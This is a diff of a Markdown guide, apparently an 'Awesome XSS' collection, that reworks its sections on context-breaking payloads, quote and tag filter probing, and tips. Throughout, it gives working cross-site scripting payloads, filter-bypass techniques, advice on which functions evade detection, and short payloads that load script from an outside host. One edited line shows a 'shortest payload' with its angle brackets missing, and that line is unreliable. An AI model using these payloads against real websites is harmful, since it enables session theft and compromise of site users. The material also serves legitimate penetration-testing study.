@@ -80,13 +80,18 @@ video
 
 ### Awesome Context Breaking
 
-#### Simple Context
+#### HTML Context
+Case: `<tag>You searched for $input. </tag>`
+
 ```
 <svg onload=alert()>
 </tag><svg onload=alert()>
 ```
 
 #### Attribute Context
+
+Case: `<tag attribute="$input">`
+
 ```
 "><svg onload=alert()>
 "><svg onload=alert()><b attr="
@@ -95,6 +100,9 @@ video
 "autocous/onfocus="alert()
 ```
 #### JavaScript Context
+
+Case: `<script> var new something = '$input'; </script>`
+
 ```
 '-alert()-'
 '-alert()//'
@@ -145,21 +153,21 @@ A good compilation of advanced XSS exploits can be found [here](http://www.xss-p
 If nothing of this works, take a look at **Awesome Bypassing** section
 
 First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of refelections.
-<br>Now for attribute context, check if double quotes (") are being filtered by entering **x"d3v**. If it gets altered to **x&amp;quot;d3v**, chances are that proper security measures are in place. If this happens, try doing the same for single quotes (') by entering **x'd3v**, if it gets altered to **x&amp;apos;**, you are doomed. The only thing you can try is encoding.<br>
+<br>Now for attribute context, check if double quotes (") are being filtered by entering `x"d3v`. If it gets altered to `x&quot;d3v`, chances are that output is getting properly escaped. If this happens, try doing the same for single quotes (') by entering `x'd3v`, if it gets altered to `x&apos;`, you are doomed. The only thing you can try is encoding.<br>
 If the quotes are not being filtered, you can simply try payloads from **Awesome Context Breaking** section.
 <br>For javascript context, check which quotes are being used for example if they are doing
 ```
 variable = 'value' or variable = "value"
 ```
-Now lets say single quotes (') are in use, in that case enter **x'd3v**. If it gets altered to **x\\'d3v**, try escaping the backslash (\) by adding a backslash to your probe i.e. **x\\'d3v**. If it works use the following payload:
+Now lets say single quotes (') are in use, in that case enter `x'd3v`. If it gets altered to `x\\'d3v`, try escaping the backslash (\) by adding a backslash to your probe i.e. `x\\'d3v`. If it works use the following payload:
 ```
 \'-alert()//
 ```
-But if it gets altered to **x\\\\'d3v**, the only thing you can try is closing the script tag itself by using
+But if it gets altered to `x\\\\'d3v`, the only thing you can try is closing the script tag itself by using
 ```
 </script><svg onload=alert()>
 ```
-For simple HTML context, the probe is **x&gt;d3v**. If it gets altered to **x&amp;gt;d3v**, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potenial filters. The dummy tag I like to use is **x&lt;xxx&gt;**. If it gets stripped or altered in any way, it means the filter is looking for a pair of **<** and **>**. It can simply bypassed using
+For simple HTML context, the probe is `x<d3v`. If it gets altered to `x&gt;d3v`, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potenial filters. The dummy tag I like to use is `x<xxx>`. If it gets stripped or altered in any way, it means the filter is looking for a pair of `<` and `>`. It can simply bypassed using
 ```
 <svg onload=alert()//
 ```
@@ -255,13 +263,13 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 Come back later
 
 ### Awesome Tips & Tricks
-- http(s):// can be shortened to // or /\\.
-- **document.cookie** can be shortened to **cookie**. It applies to other DOM objects as well.
-- alert and other pop-up functions don't need a value, so stop doing **alert('XSS')** and start doing **alert()**
-- You can use **//** to close a tag instead of **>**.
-- I have found that **confirm** is the least detected pop-up function so stop using **alert**.
-- Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"&gt;**
-- The shortest independent "XSS" payload is **&lt;embed src=//14.rs&gt;** (19 chars)
+- `http(s)://` can be shortened to `//` or `/\\` or `\\`.
+- `document.cookie` can be shortened to `cookie`. It applies to other DOM objects as well.
+- alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`
+- You can use `//` to close a tag instead of `>`.
+- I have found that `confirm` is the least detected pop-up function so stop using `alert`.
+- Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
+- The shortest independent XSS payload is `script src=//14.rs` (19 chars)
 
 ### Awesome Credits
 All the payloads are crafted by me unless specified.
